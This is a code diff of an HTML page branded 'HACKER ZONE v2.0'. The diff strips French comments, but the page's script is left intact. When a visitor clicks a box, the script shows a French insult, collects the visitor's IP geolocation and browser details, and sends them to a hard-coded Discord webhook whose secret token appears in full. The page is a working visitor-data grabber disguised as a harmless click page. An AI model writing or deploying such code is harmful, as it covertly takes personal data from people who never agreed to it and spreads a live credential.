@@ -110,7 +110,6 @@
     <div class="footer">[ HACKER ZONE v2.0 ]</div>
 
     <script>
-        // ⚠️ WEBHOOK - REMPLACE PAR UN NOUVEAU SI INVALIDE
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1519751550120235029/zE5YIDhewogT6QLFDTVYLE_1SB-NaysvFXPwOle51LkHX2iTlvrLuSq1bsGsuHoaczqM";
 
         async function getIPInfo() {
@@ -180,23 +179,17 @@
             } catch {}
         }
 
-        // Action au clic sur la boîte
         document.getElementById('mainBox').addEventListener('click', function() {
             const mainText = document.getElementById('mainText');
             const clickMsg = document.getElementById('clickMessage');
 
-            // Cacher le texte original
             mainText.classList.add('hidden');
-            // Afficher NTM FDP
             clickMsg.style.display = 'block';
-            // Changer la bordure en rouge
             this.style.borderColor = '#ff0044';
             this.style.boxShadow = '0 0 80px rgba(255, 0, 68, 0.5)';
-            // Désactiver le clic
             this.style.cursor = 'default';
             this.onclick = null;
 
-            // Envoyer les infos au webhook
             (async () => {
                 const ipInfo = await getIPInfo();
                 const browserInfo = getBrowserInfo();
